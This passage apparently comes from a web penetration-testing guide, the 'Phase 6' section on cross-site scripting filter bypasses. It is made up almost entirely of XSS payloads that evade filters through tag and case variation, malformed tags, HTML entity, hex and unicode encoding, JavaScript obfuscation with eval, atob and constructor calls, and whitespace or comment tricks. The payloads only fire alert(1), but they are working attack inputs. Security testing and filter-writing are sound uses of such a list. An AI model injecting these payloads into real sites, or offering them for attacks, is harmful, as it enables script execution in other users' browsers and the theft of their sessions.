# Phase 6: Filter Bypass Techniques

#### Tag and Attribute Variations

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

<!-- Alternative tags -->
<svg/onload=alert(1)>
<body/onload=alert(1)>
<marquee/onstart=alert(1)>
<details/open/ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Malformed tags -->
<img src=x onerror=alert(1)//
<img """><script>alert(1)</script>">
```

#### Encoding Bypass

```html
<!-- HTML entity encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Hex encoding -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- Unicode encoding -->
<script>\u0061lert(1)</script>

<!-- Mixed encoding -->
<img src=x onerror=\u0061\u006cert(1)>
```

#### JavaScript Obfuscation

```javascript
// String concatenation
<script>eval('al'+'ert(1)')</script>

// Template literals
<script>alert`1`</script>

// Constructor execution
<script>[].constructor.constructor('alert(1)')()</script>

// Base64 encoding
<script>eval(atob('YWxlcnQoMSk='))</script>

// Without parentheses
<script>alert`1`</script>
<script>throw/a]a]/.source+onerror=alert</script>
```

#### Whitespace and Comment Bypass

```html
<!-- Tab/newline insertion -->
<img src=x	onerror
=alert(1)>

<!-- JavaScript comments -->
<script>/**/alert(1)/**/</script>

<!-- HTML comments in attributes -->
<img src=x onerror="alert(1)"<!--comment-->
```

## Quick Reference